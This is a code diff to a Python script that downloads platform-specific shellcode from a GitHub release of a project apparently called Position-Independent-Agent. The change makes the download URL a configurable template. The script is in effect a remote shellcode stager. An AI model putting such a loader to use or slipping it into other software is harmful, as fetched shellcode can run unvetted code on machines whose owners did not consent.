@@ -38,8 +38,11 @@ try:
 except AttributeError:
     pass  # Python < 2.7.9 / 3.4.3: verification not enabled anyway
 
-REPO = "nostdlib/Position-Independent-Agent"
-DEFAULT_TAG = "preview"
+# Download URL template. Use {platform} and {arch} placeholders.
+# Examples:
+#   GitHub Releases: "https://github.com/user/repo/releases/download/latest/{platform}-{arch}.bin"
+#   Custom server:   "https://example.com/builds/{platform}-{arch}.bin"
+URL_TEMPLATE = "https://github.com/nostdlib/Position-Independent-Agent/releases/download/preview/{platform}-{arch}.bin"
 
 # =============================================================================
 # Logging
@@ -206,18 +209,15 @@ def _http_get(url):
 
 
 def download(platform_name, arch):
-    asset = "%s-%s.bin" % (platform_name, arch)
-    url = "https://github.com/%s/releases/download/%s/%s" % (REPO, DEFAULT_TAG, asset)
+    url = URL_TEMPLATE.replace("{platform}", platform_name).replace("{arch}", arch)
 
-    _log('inf', "Asset: %s" % asset)
-    _log('inf', "URL:   %s" % url)
+    _log('inf', "URL: %s" % url)
     _log('inf', "Downloading ...")
     try:
         data = _http_get(url)
     except HTTPError as e:
         if e.code == 404:
-            _log('err', "Asset not found (HTTP 404): %s @ %s" % (asset, DEFAULT_TAG))
-            _log('err', "URL: %s" % url)
+            _log('err', "Not found (HTTP 404): %s" % url)
             sys.exit(1)
         _log('err', "HTTP error %d: %s" % (e.code, e.reason))
         raise
@@ -465,7 +465,7 @@ def main():
         sys.exit(1)
 
     plat, remote_arch = _ARTIFACT_MAP[key]
-    _log('inf', "Platform: %s  arch: %s  tag: %s" % (plat, remote_arch, DEFAULT_TAG))
+    _log('inf', "Platform: %s  arch: %s" % (plat, remote_arch))
 
     shellcode = download(plat, remote_arch)
     _log('ok', "Shellcode ready: %d bytes" % len(shellcode))
